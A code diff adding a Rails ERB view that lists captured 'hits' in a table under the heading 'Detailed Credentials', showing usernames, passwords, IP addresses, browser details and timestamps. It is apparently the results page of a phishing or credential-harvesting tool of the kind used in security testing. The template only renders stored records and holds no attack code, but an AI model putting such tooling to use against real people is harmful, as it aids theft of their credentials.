@@ -1,0 +1,44 @@
+<div class="tab-pane" id="Logs">
+  <%if @hits %>
+  	<h5>Detailed Credentials</h5>
+	  <table class="table table-condensed">
+	    <thead>
+	    	<th>Username</th>
+	    	<th>Password</th>
+	      <th>IP</th>
+	      <th>Port</th>
+	      <th>Domain</th>
+	      <th>Path</th>
+	      <th>Forwarded</th>
+	      <th>OS</th>
+	      <th>Browser</th>
+	      <th>Engine</th>
+	      <th>Platform</th>
+	      <th>Created</th>         
+	    </thead>
+	    <tbody>
+	      <% @hits.each do |hit| %>
+	        <tr>
+	        	<td><%if !hit.username.nil?%><%=h hit.username %><%end%></td>
+	        	<td><%if !hit.password.nil?%><span class="label label-info"><%=h hit.password %></span><%end%></td>
+	          <td><%=h hit.ip %></td>
+	          <td><%=h hit.port %></td>
+	          <td><%=h hit.domain %></td>
+	          <td><%=h hit.path[0..20] %></td>
+	          <% if !hit.forwarded? %>
+	          <td><span class="label label-success"><%=h hit.forwarded? %></span></td>
+	          <% else %>
+	          <td><span class="label label-danger"><%=h hit.forwarded? %></span></td>
+	          <% end %>		
+						<td><%=h hit.ua_os %></td>	
+						<td><%=h hit.ua_browser %></td>	
+						<td><%=h hit.ua_engine %></td>	
+						<td><%=h hit.ua_platform %></td>
+	          <td><small><%=h hit.created_at.strftime("%m/%d/%Y-%T")%></small></td>
+	        </tr>
+	      <% end %>
+	    </tbody>
+	  </table>
+  <% end %>
+</div>
+
